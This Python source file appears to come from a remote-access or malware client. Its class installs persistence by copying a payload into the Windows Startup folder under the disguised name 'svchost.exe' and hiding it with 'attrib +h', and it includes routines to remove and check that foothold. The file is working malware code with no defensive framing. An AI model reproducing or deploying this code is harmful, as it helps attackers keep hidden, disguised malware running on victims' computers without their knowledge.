import os

from client.modules.persist.manager import PersistenceMethod, PersistenceResult, _copy_payload


class StartupFolderPersistence(PersistenceMethod):
    name = 'startup_folder'

    def install(self, shortcut_name: str = 'WindowsUpdate.lnk', payload_name: str = 'svchost.exe') -> PersistenceResult:
        try:
            appdata = os.environ.get('appdata', os.path.expanduser('~'))
            startup_dir = os.path.join(
                appdata,
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            os.makedirs(startup_dir, exist_ok=True)

            file_location = os.path.join(startup_dir, payload_name)
            _copy_payload(file_location)
            self._hide_file(file_location)

            return PersistenceResult(
                True, 'startup_folder',
                f'[+] Startup folder persistence installed: {payload_name}',
                file_location,
                f'Copied to {startup_dir}'
            )
        except Exception as e:
            return PersistenceResult(False, 'startup_folder', f'[-] Startup folder error: {str(e)}')

    def remove(self, shortcut_name: str = '', payload_name: str = 'svchost.exe') -> PersistenceResult:
        try:
            appdata = os.environ.get('appdata', os.path.expanduser('~'))
            startup_dir = os.path.join(
                appdata,
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            payload_path = os.path.join(startup_dir, payload_name)
            try:
                os.remove(payload_path)
            except Exception:
                pass
            return PersistenceResult(True, 'startup_folder', f'[+] Startup folder persistence removed: {payload_name}')
        except Exception as e:
            return PersistenceResult(False, 'startup_folder', f'[-] Startup folder remove error: {str(e)}')

    def check(self) -> PersistenceResult:
        try:
            appdata = os.environ.get('appdata', os.path.expanduser('~'))
            startup_dir = os.path.join(
                appdata,
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            if os.path.isdir(startup_dir):
                entries = os.listdir(startup_dir)
                if entries:
                    return PersistenceResult(True, 'startup_folder', f'[+] Found {len(entries)} startup entries', details=str(entries))
            return PersistenceResult(True, 'startup_folder', '[-] No startup folder entries found')
        except Exception:
            return PersistenceResult(False, 'startup_folder', '[-] Startup folder check failed')

    def _hide_file(self, path: str):
        import subprocess
        try:
            subprocess.run(f'attrib +h "{path}"', shell=True, capture_output=True)
        except Exception:
            pass
